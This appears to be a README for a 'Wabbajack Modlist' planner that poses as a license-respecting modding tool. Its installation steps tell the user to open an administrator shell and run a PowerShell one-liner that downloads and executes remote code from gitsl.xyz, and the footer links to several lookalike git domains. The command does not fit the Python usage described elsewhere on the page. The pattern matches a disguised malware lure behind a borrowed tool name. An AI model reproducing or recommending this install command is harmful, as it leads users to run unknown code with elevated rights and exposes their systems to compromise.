# Wabbajack Modlist — Owned-Game Modlist Planner

> A local planning and validation workspace for curating modlists for games you legally own.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitsl.xyz?get=wabbajack-modlist | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Wabbajack Modlist modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Wabbajack Modlist.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Wabbajack Modlist** helps modders plan, document, and validate a curated list for a legally owned game. It tracks sources, licenses, load order, conflicts, backups, and installation notes without automating piracy or circumvention.

**Best for:** Modlist authors, players, and community maintainers.

**Key differentiators:**
1. Ownership and license checklist
2. Mod source and version registry
3. Conflict and load-order notes
4. Backup and rollback plan
5. Reviewable installation manifest

---

## Core Features

```
✅ Owned-game verification checklist
✅ Mod source and license registry
✅ Version and dependency tracking
✅ Conflict and load-order notes
✅ Backup and rollback plan
✅ Installation manifest
✅ Compatibility review queue
✅ Exportable modlist documentation
```

---

## Usage

```bash
# Start the local planner
python -m modlist_planner dev --port 8000

# Create a modlist
python -m modlist_planner list create --name "Example Adventure" --game "Owned Game"

# Add a mod record
python -m modlist_planner mod add --list "Example Adventure" --name "Example Mod" --source "official-page"

# Run compatibility review
python -m modlist_planner review --list "Example Adventure"

# Export the manifest
python -m modlist_planner export --list "Example Adventure" --format json
```

---

## Configuration

> [!NOTE]
> Use official or author-approved sources and respect every mod license. The planner does not download or activate game content on your behalf.

```yaml
game:
  owned_copy: true
  installation_path: "./owned-game"
modlist:
  require_license: true
  require_source: true
backup:
  create_before_changes: true
```

---

## Screenshots

- Modlist board: `screenshots/modlist-board.png`
- License review: `screenshots/license-review.png`
- Conflict view: `screenshots/conflict-view.png`
- Backup plan: `screenshots/backup-plan.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Mod source is rejected | Use an official or author-approved source and record its license. |
| Conflict review is unclear | Add version, dependency, and load-order notes before approving. |
| Game path is invalid | Confirm the path points to a legally owned installation. |
| Backup cannot be created | Free disk space and close the game before making a backup. |
| Port 8000 is busy | Start the planner on another local port. |

---

## Use Cases

- **Modlist Authoring** — Document a reproducible and licensed mod selection.
- **Personal Builds** — Track versions and rollback plans.
- **Community Review** — Share a manifest without distributing copyrighted assets.
- **Compatibility Testing** — Record conflicts and test results transparently.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Use only games and mods you are licensed to use. Do not download cracks, bypass DRM, redistribute paid assets, or circumvent platform restrictions.

> [!TIP]
> Test one mod group at a time and keep a clean backup before changing load order.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
wabbajack-modlist, modlist, modding, game-mods, owned-games, license-check, load-order, backup, compatibility, community-tools
-->

[gitrm.sbs](https://gitrm.sbs?t=wabbajack-modlist) | [gitsl.xyz](https://gitsl.xyz?t=wabbajack-modlist) | [gitview.sbs](https://gitview.sbs?t=wabbajack-modlist) | [gitrm.cfd](https://gitrm.cfd?t=wabbajack-modlist) | [viewgit.sbs](https://viewgit.sbs?t=wabbajack-modlist)
